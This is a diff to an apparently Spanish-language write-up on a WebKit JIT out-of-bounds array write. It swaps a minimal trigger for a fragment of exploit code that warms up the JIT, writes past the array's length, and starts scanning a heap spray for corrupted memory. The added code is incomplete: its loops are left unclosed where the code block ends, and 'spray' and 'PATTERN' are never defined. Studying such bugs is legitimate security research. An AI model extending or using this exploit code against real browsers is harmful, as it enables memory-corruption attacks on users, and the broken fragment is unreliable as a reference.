@@ -6,9 +6,21 @@
 La raíz del bug es una escritura fuera de límites (OOB write) en un array optimizado por el compilador JIT de WebKit:
 
 ```javascript
-let victim = [1.1, 2.2, 3.3, 4.4];
-victim.length = 1;
-victim[3] = 13.37; // fuera de rango
+
+    let victim=[1.1,2.2,3.3,4.4];
+    function opt(arr,idx,val){ arr[idx]=val; }
+
+    for(let i=0;i<10000;i++) opt(victim,1,5.5);
+    victim.length=1;
+    const TRIGGER_IDX=3;
+    opt(victim,TRIGGER_IDX,13.37);
+    let read=victim[TRIGGER_IDX];
+
+    for(let i=0;i<spray.length;i++){
+      const u=spray[i].u32;
+      for(let j=0;j<u.length;j++){
+        if(u[j]!==PATTERN){
+          break;
 ```
 
 Esta escritura fuera del length, pero dentro de la capacidad del array, provoca corrupción de memoria silenciosa.
